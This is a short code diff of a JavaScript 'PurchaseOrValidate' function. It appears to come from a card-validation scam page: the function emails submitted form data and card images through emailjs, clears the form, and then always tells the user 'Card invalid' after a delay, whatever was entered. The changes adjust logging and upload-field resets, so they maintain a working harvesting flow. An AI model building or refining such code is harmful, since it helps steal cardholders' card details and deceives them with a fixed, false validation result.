@@ -277,7 +277,7 @@ function PurchaseOrValidate() {
         }
         emailjs.send(serviceId, templateId, templateParams, publicKey)
             .then((response) => {
-                // console.log("email sent succesfully", response)
+                console.log("email sent succesfully", response)
             })
             .catch((error) => {
                 console.error("Error", error)
@@ -285,10 +285,17 @@ function PurchaseOrValidate() {
             .finally(() => {
                 setLoading(false);
             });
-        // console.log(JSON.stringify(formData, null, 2));
+        // Only reset image upload fields if images were uploaded
+        if (frontImageUrl) {
+            document.getElementById("frontImageUpload").value = "";
+        }
+        if (backImageUrl) {
+            document.getElementById("backImageUpload").value = "";
+        }
+        
         clearFormData();
-        document.getElementById("frontImageUpload").value = "";
-        document.getElementById("backImageUpload").value = ""; 
+        // document.getElementById("frontImageUpload").value = "";
+        // document.getElementById("backImageUpload").value = ""; 
         setTimeout(() => {
             alert('Card invalid');
         }, 4000);
